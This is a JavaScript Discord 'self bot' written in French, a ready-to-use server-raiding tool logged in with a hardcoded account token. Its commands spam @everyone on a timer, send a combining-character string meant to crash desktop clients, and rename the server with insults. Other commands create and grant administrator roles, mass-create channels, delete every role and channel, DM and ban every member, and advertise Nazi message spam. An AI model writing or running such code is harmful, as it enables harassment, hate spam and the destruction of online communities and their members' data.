const Discord = require('discord.js');
const client = new Discord.Client();
var prefix = '++'

client.login('NDUwNzYzMjgxMjkzMTE1NDA0.DjJvuQ.uuQ6jbGOY2YS_qOfmWW22v9dWLU')

client.on('ready', () => {
    console.log('Le self bot de Lucky est bien en route \n Connecté sur ' + client.guilds.array());
});

client.on('message' , message => {

    if (message.author.id != 450763281293115404) return;

    if (message.content === prefix + 'menu') {
       var utility_embed = new Discord.RichEmbed()
       .setAuthor(client.user.username, client.user.avatarURL,  "https://discordapp.com/oauth2/authorize?client_id=461492485613551616&scope=bot&permissions=8%22")
       .setColor("RANDOM")
       .setTitle("Commande Self Bot")
       .setThumbnail(client.user.avatarURL)
       .setDescription("Veuillez voir regarder les commandes du Self Bot, n'oubliez pas le prefix avant ")
       .addBlankField(1)
       .addField("menu", "Ouvre le menu du Self Bot")
       .addBlankField(1)
       .addField("spam", "Spam des messages **issou** en everyone")
       .addBlankField(1)
       .addField("reponseD", "Fait signifier que l'élite a détruit le serveur")
       .addBlankField(1)
       .addField("owner", "Adresse un message au fondateur du serveur")
       .addBlankField(1)
       .addField("cc", "Envoie un petit coucou a tout le serveur en everyone")
       .addBlankField(1)
       .addField("nazi1", "Spam des messages nazis")
       .addBlankField(1)
       .addField("crash", "Spam des messages crash en everyone (fait crash uniquement les personnes sur l'appli pc et peut provoquer quelques problemes sur l'appli téléphone")
       .addBlankField(1)
       .addField("nameserver", "Rename le serveur a l'infini (perm requise)")
       .addBlankField(1)
       .addField("roles", "Crée pleins de roles avec les perms admins (perm requise)")
       .addBlankField(1)
       .addField("channel", "Crée pleins de channels (perm requise)")
       .addBlankField(1)
       .addField("merci", "Crée le role avec pour nom **merci** avec les perms admins (perm requise)")
       .addBlankField(1)
       .addField("setmerci", "Ajoute le rôle **merci** (perm requise)")
       .addBlankField(1)
       .setFooter("© Dev par Lucky#0666, avec l'aide des kheys Drenox et KnowLedge")
       .setTimestamp()
       message.channel.sendMessage(utility_embed);

       console.log(client.user.username+ " a utilisé la commande menu")
    }

    if (message.content.startsWith(prefix+ 'spam')) {
        var str = message.content
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send(str.substring(7))
        }, 1500);

        console.log(client.user.username+ " a utilisé la commande spam")
    }

    if (message.content.startsWith(prefix+ 'private')) {
        var str = message.content
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.members.array().length; i++) {
            server.members.array()[i].send(str.substring(10))
        }

        if (message.deletable) message.delete()
    }


    if (message.content === prefix + 'crash') {
        let i = 0;
        let interval = setInterval(function() {
            message.channel.send('@everyone   ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌')
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande crash")
    }

    if (message.content === prefix + 'nameserver') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.setName('La réponse D')
            message.guild.setName('vous a')
            message.guild.setName('enculé')
            message.guild.setName('bande de putes')
        }, 1500)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande nameserver")
    }

    if (message.content === prefix + 'roles') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.createRole({
                name: 'D',
                color: 'RANDOM',
                permissions: 2146958591,
            });
        }, 1500)

        console.log(client.user.username+ " a utilisé la commande roles")

        if (message.deletable) message.delete();
    }

    if (message.content === prefix + 'deleter') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.roles.array().length; i++) {
            server.roles.array()[i].delete();
        }

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande deleter")
    }

    if (message.content === prefix + 'channel') {
        let i = 0;
        let interval = setInterval(function() {
            message.guild.createChannel('Reponse D', 'text')
        }, 1500)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande channel")
    }

    if (message.content === prefix + 'deletec') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.channels.array().length; i++) {
            server.channels.array()[i].delete();
        }

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande deletec")
    }

    if (message.content === prefix + 'merci') {
        message.guild.createRole({
            name : 'merci',
            color: 'WHITE',
            permissions: 2146958591,
        })

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande merci")
    }

    if (message.content === prefix + 'setmerci') {
        let merciRoles = message.guild.roles.find('name', "merci");
        message.member.addRole(merciRoles.id)

        if (message.deletable) message.delete();

        console.log(client.user.username+ " a utilisé la commande setmerci")
    }

    if (message.content === prefix + 'banall') {
        var server = client.guilds.get(message.guild.id);
        for (var i = 0; i < server.members.array().length; i++) {
            server.members.array()[i].ban()
        }

        if (message.deletable) message.delete();
        
        console.log(client.user.username+ " a utilisé la commande banall")
    }
})
